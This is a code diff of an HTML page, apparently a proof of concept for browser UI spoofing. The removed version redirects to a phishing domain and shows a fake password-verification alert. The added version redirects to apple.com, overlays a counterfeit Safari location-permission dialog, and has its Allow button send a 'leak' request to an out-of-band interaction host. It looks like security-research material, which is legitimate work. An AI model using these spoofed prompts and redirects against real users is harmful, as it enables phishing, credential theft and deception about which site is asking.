@@ -1,22 +1,31 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Loading...</title>
-  <script>
-    // Simulasikan pergantian halaman (tanpa mengubah tab title)
-    window.onload = function () {
-      // Ganti lokasi ke domain phishing tanpa menambah entry history
-      location.replace("https://phishing.com");
+  <body onclick="startSpoof()">
+    <h1>Tap anywhere to continue...</h1>
+    <script>
+      function startSpoof() {
+        // Simulasikan user berpindah ke trusted origin
+        location.replace("https://apple.com");
 
-      // Delay agar phishing.com termuat di address bar
-      setTimeout(() => {
-        // Tampilkan native alert tanpa origin context
-        alert("🔒 Please verify your password to continue.");
-      }, 1000);
-    };
-  </script>
-</head>
-<body>
-  <p>Loading…</p>
-</body>
+        // Native prompt diblok → ganti dengan spoof
+        setTimeout(() => {
+          // Spoof UI: seolah-olah Safari meminta lokasi
+          let spoof = document.createElement("div");
+          spoof.innerHTML = `
+            <div style="position:fixed;top:30%;left:50%;transform:translateX(-50%);
+                        background:#fff;border:1px solid #ccc;padding:20px;
+                        box-shadow:0 0 10px rgba(0,0,0,0.5);font-family:sans-serif">
+              <b>Safari would like to access your location</b><br><br>
+              <button onclick="exfiltrate()">Allow</button>
+              <button>Don't Allow</button>
+            </div>`;
+          document.body.appendChild(spoof);
+        }, 1000);
+      }
+
+      function exfiltrate() {
+        fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/?leak=location_spoof");
+      }
+    </script>
+  </body>
 </html>
